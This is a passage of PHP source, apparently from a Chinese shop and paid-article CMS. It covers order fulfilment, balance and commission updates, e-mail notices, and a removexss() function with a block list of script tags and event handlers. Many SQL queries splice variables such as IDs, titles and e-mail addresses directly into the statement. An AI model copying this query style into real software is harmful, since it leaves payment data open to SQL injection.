			if($N_price==$money){

				if($paytype=="余额支付"){
					mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
				}else{
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
				}
				
				mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','文章付费阅读','".date('Y-m-d H:i:s')."',-".$money.",'$genkey')");
				mysqli_query($conn, "insert into sl_orders(O_nid,O_mid,O_time,O_type,O_price,O_num,O_title,O_pic,O_state,O_address,O_content,O_genkey) values($id,$M_id,'".date('Y-m-d H:i:s')."',1,$money,1,'$N_title','$N_pic',1,'$email','$genkey','$genkey')");
				if($N_mid!=$M_id){
					mysqli_query($conn, "update sl_member set M_fen=M_fen+$money where M_id=$M_id");
				}
				if($N_mid>0){
					mysqli_query($conn, "update sl_member set M_money=M_money+".$money." where M_id=$N_mid");
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($N_mid,'".date('YmdHis').rand(10000000,99999999)."','售出文章-".$N_title."','".date('Y-m-d H:i:s')."',$money,'')");
				}
				if($N_fx==1){
					fx($money,$M_id,$N_mid);
				}
				sendmail("查收您的付费阅读文章", "<p>感谢您购买文章《".$N_title."》阅读</p><p>阅读链接：http://".$D_domain."/?type=newsinfo&id=".$id."&genkey=".$genkey."</p>", $email);
			}
			sendmail("有用户通过".$paytype."阅读文章","用户ID：".$M_id."<br>文章名称：".$N_title."<br>订单金额：".$money."元<br>交易单号：".$no,$C_email);

        }else{
			$sql2="select * from sl_product where P_del=0 and P_id=".$id;
			$result2 = mysqli_query($conn, $sql2);
			$row2 = mysqli_fetch_assoc($result2);
			if (mysqli_num_rows($result2) > 0) {
				$P_title=$row2["P_title"];
				$P_pic=$row2["P_pic"];
				$P_sell=$row2["P_sell"];
				$P_selltype=$row2["P_selltype"];
				$P_price=$row2["P_price"]*$P_discount;
				$P_mid=$row2["P_mid"];
				$P_fx=$row2["P_fx"];
			}
			if(round($P_price*$num,2)==round($money,2)){
				switch($P_selltype){
				  	case 0:
				  		$O_content=$P_sell;
				  		$O_address=$email;
				  		$O_state=1;
				  	break;
				  	case 1:
				  		for($i=0;$i<$num;$i++){
							$C_id=getrs("select * from sl_card where C_del=0 and C_use=0 and C_sort=".intval($P_sell),"C_id");
							$C_content=getrs("select * from sl_card where C_id=".intval($C_id),"C_content");
							if($C_content==""){
								$O_content=$O_content."商品缺货，请联系客服||";
							}else{
								$O_content=$O_content.$C_content."||";
							}
							mysqli_query($conn,"update sl_card set C_use=1 where C_id=".intval($C_id));
						}
						$O_content=substr($O_content,0,strlen($O_content)-2);
						$O_address=$email;
						$O_state=1;
				  	break;
				  	case 2:
				  		mysqli_query($conn,"update sl_product set P_rest=P_rest-$num where P_id=".$id);
				  		$O_content="实物商品，由商家手动发货";
				  		$O_address=$email;
				  		$O_state=0;
				  	break;
				}
			
				mysqli_query($conn, "update sl_product set P_sold=P_sold+$num where P_id=".$id);
				if($paytype=="余额支付"){
					mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
				}else{
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
				}
				if($P_mid!=$M_id){
					mysqli_query($conn, "update sl_member set M_fen=M_fen+$money where M_id=$M_id");
				}
				
				mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','购买商品','".date('Y-m-d H:i:s')."',-".$money.",'$genkey')");
				mysqli_query($conn, "insert into sl_orders(O_pid,O_mid,O_time,O_type,O_price,O_num,O_content,O_title,O_pic,O_address,O_state,O_genkey) values($id,$M_id,'".date('Y-m-d H:i:s')."',0,$P_price,$num,'$O_content','$P_title','$P_pic','$O_address',$O_state,'$genkey')");

				if($P_mid>0){
					mysqli_query($conn, "update sl_member set M_money=M_money+".$money." where M_id=$P_mid");
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($P_mid,'".date('YmdHis').rand(10000000,99999999)."','售出商品-".$P_title."','".date('Y-m-d H:i:s')."',$money,'')");
				}
				if($P_fx==1){
					fx($money,$M_id,$P_mid);
				}
				
				if(checkauth()){
					plug("x4","../../conn/plug/");
					require "../../conn/plug/x4.php";
				}
				sendmail("您的购买的商品已发货","<p>商品名称：".$P_title."</p><p>发货内容：".$O_content."</p>",$email);
			}
			sendmail("有用户通过".$paytype."购物","用户ID：".$M_id."<br>商品名称：".$P_title."<br>订单金额：".$money."元<br>交易单号：".$no,$C_email);
        }
        
	    return true;
    }else{
    	return false;
    }
}


function fx($money,$M_id,$P_mid){
	global $C_fx1,$C_fx2,$C_fx3,$conn;
	$genkey=gen_key(20);

	if(checkauth()){
		plug("x2","../../conn/plug/");
		require "../../conn/plug/x2.php";
	}
}
function removexss($val) {
    $val = preg_replace ( '/([\x00-\x08\x0b-\x0c\x0e-\x19])/', '', $val );

    $search = 'abcdefghijklmnopqrstuvwxyz';
    $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $search .= '1234567890!@#$%^&*()';
    $search .= '~`";:?+/={}[]-_|\'\\';
    for($i = 0; $i < strlen ( $search ); $i ++) {

        $val = preg_replace ( '/(&#[xX]0{0,8}' . dechex ( ord ( $search [$i] ) ) . ';?)/i', $search [$i], $val );

        $val = preg_replace ( '/(&#0{0,8}' . ord ( $search [$i] ) . ';?)/', $search [$i], $val );
    }

    $ra1 = array (
        'javascript',
        'vbscript',
        'expression',
        'applet',
        'meta',
        'xml',
        'blink',
        'script',
        'object',
        'iframe',
        'frame',
        'frameset',
        'ilayer',
        'bgsound'
    );
    $ra2 = array (
        'onabort',
        'onactivate',
        'onafterprint',
        'onafterupdate',
        'onbeforeactivate',
        'onbeforecopy',
        'onbeforecut',
        'onbeforedeactivate',
        'onbeforeeditfocus',
        'onbeforepaste',
        'onbeforeprint',
        'onbeforeunload',
        'onbeforeupdate',
        'onbegin',
        'onblur',
        'onbounce',
        'oncellchange',
        'onchange',
        'onclick',
        'oncontextmenu',
        'oncontrolselect',
        'oncopy',
        'oncut',
        'ondataavailable',
        'ondatasetchanged',
        'ondatasetcomplete',
        'ondblclick',
        'ondeactivate',
        'ondrag',
        'ondragend',
        'ondragenter',
        'ondragleave',
        'ondragover',
        'ondragstart',
        'ondrop',
        'onerror',
        'onerrorupdate',
        'onfilterchange',
        'onfinish',
        'onfocus',
        'onfocusin',
        'onfocusout',
        'onhelp',
        'onkeydown',
        'onkeypress',
        'onkeyup',
        'onlayoutcomplete',
        'onload',
        'onlosecapture',
        'onmousedown',
        'onmouseenter',
        'onmouseleave',
        'onmousemove',
        'onmouseout',
        'onmouseover',
        'onmouseup',
        'onmousewheel',
        'onmove',
        'onmoveend',
        'onmovestart',
        'onpaste',
        'onpropertychange',
        'onreadystatechange',
        'onreset',
        'onresize',
        'onresizeend',
        'onresizestart',
        'onrowenter',
        'onrowexit',
        'onrowsdelete',
        'onrowsinserted',
        'onscroll',
        'onselect',
        'onselectionchange',
        'onselectstart',
        'onstart',
        'onstop',
        'onsubmit',
        'onunload'
    );
    $ra = array_merge ( $ra1, $ra2 );

    $found = true;
    while ( $found == true ) {
        $val_before = $val;
        for($i = 0; $i < sizeof ( $ra ); $i ++) {
            $pattern = '/';
            for($j = 0; $j < strlen ( $ra [$i] ); $j ++) {
                if ($j > 0) {
                    $pattern .= '(';
                    $pattern .= '(&#[xX]0{0,8}([9ab]);)';
                    $pattern .= '|';
                    $pattern .= '|(&#0{0,8}([9|10|13]);)';
                    $pattern .= ')*';
                }
                $pattern .= $ra [$i] [$j];
            }
            $pattern .= '/i';
            $replacement = substr ( $ra [$i], 0, 2 ) . ' ' . substr ( $ra [$i], 2 );
            $val = preg_replace ( $pattern, $replacement, $val );
            if ($val_before == $val) {

                $found = false;
            }
        }
    }
    return $val;
}

function gethttp(){
    if (is_ssl()){
        $gethttp="https://";
    }else{
        $gethttp="http://";
    }
    return $gethttp;
}


function is_ssl() {
    if(isset($_SERVER['HTTPS']) && ('1' == $_SERVER['HTTPS'] || 'on' == strtolower($_SERVER['HTTPS']))){
        return true;
    }else{
        if(isset($_SERVER['SERVER_PORT']) && ('443' == $_SERVER['SERVER_PORT'] )) {
            return true;
        }else{
            if(isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && ('https' == $_SERVER['HTTP_X_FORWARDED_PROTO'] )) {
                return true;
            }else{
                if(isset($_SERVER['HTTP_FROM_HTTPS']) && ('on' == $_SERVER['HTTP_FROM_HTTPS'] )) {
                    return true;
                }else{
                    return false;
                }
            }
        }
    }
}

function html($str){
	if(checkauth()){
		plug("x9","conn/plug/");
		require "conn/plug/x9.php";
	}else{
		die("{\"msg\":\"免费版暂不支持伪静态\"}");
	}
	return $str;
}
?>